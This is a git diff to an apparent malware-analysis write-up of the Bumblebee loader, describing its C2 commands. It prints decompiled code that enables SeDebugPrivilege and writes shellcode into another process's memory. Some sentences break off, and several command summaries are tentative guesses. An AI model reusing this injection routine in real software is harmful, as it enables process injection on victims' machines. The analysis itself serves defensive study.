@@ -43,8 +43,14 @@ Following this we see some strings indicating the malware is collecting informat
 ![alt text](/resources/bumblebee/image8.png)
 ![alt text](/resources/bumblebee/image9.png)
 
-Next we move onto address `0014001085E` 
-Here a function is called that does various interesting things.
+### C2 Command Handling
+
+This section of code looks like it's related to the handling of commands sent by the C2. There are various command names, each one doing something different. The commands I have found are shi, dij, dex, sdl, ins, gdt and plg
+Let's look at what shi does in dpeth, then summarize what the rest of the commands do.
+
+#### shi
+
+If Bumblebee recieves the shi command, a function is called that does various interesting things.
 
 First, an API call to GetSpecialFolderPath with an interesting array of paths
 ![alt text](/resources/bumblebee/image10.png)
@@ -55,6 +61,80 @@ Then a function is called that generates a random executable name. This is likel
 We then enter a subroutine that gathers information about the infected host.
 ![alt text](/resources/bumblebee/image12.png)
 
-Bumblebee then loops through it's own threads using `CreateToolhelp32Snapshot`
+Bumblebee then loops through it's own threads using `CreateToolhelp32Snapshot`, tries finding a specific one, then opens it
+
+![alt text](/resources/bumblebee/image13.png)
+
+Bumblebee loads Advapi32.dll and uses 
+
+```  
+  hObject = a1;
+  v7 = 0ui64;
+  LibraryA = LoadLibraryA("Advapi32.dll");
+  OpenProcessToken = GetProcAddress(LibraryA, "OpenProcessToken");
+  CurrentProcess = GetCurrentProcess();
+  if ( !(OpenProcessToken)(CurrentProcess, 40i64, &hObject) )
+    return 0i64;
+  if ( !LookupPrivilegeValueW(0i64, L"SeDebugPrivilege", &Luid) )
+  {
+    CloseHandle(hObject);
+    return 0i64;
+  }
+  *(&v7 + 4) = Luid;
+  LODWORD(v7) = 1;
+  HIDWORD(v7) = 2;
+  AdjustTokenPrivileges = GetProcAddress(LibraryA, "AdjustTokenPrivileges");
+  v6 = (AdjustTokenPrivileges)(hObject, 0i64, &v7, 16i64, 0i64, 0i64);
+  CloseHandle(hObject);
+  return v6;
+```
+After performing privilege escalation, bumblebee writes shellcode to memory. Specifically, bumblebee overwrites the Sleep function in Windows with shellcode: 
+
+```
+  v6[0] = 1220555080;                           // These variables are actually shellcode beind displayed as decimal
+                                                // 
+  v6[1] = 826858033;
+  v6[2] = 65583561;
+  v6[3] = 28966912;
+  v6[4] = 1207959552;
+  v7 = -72;
+  *&v8[7] = -338624751;
+  v9 = -33;
+  ModuleHandleA = GetModuleHandleA("kernel32.dll");
+  *v8 = GetProcAddress(ModuleHandleA, "SleepEx");// overwriting Sleep with shellcode
+  v3 = ntdll_handle_look_for_specific_mem_section(hProcess);
+  WriteProcessMemory = GetProcAddress(ModuleHandleA, "WriteProcessMemory");
+  VirtualProtectEx(hProcess, v3, 0x21ui64, 0x40u, &flOldProtect);
+  result = (WriteProcessMemory)(hProcess, v3, v6, 33i64, &v11);
+  if ( result )
+  {
+    VirtualProtectEx(hProcess, v3, 0x21ui64, flOldProtect, &flOldProtect);
+    return 1i64;
+  }
+  return result;
+
+```
+Following this, bumblebee injects itself into NtQueueApcThread by 
 
 
+
+#### dex
+the `dex` command appears to queue bumblebee to create a randomly named .exe file
+
+
+
+#### sdl 
+Looks as though it runs cmd.exe and runs mkdir and copy
+Additionally it looks like it is at least initializing COM proxies 
+Also has ability to open Powershell
+Potentially able to remove files from the victim 
+
+#### ins 
+powershell remove dirs 
+
+#### gdt
+
+Not too sure what this one does
+
+#### plg
+Domain generation and connection handling 
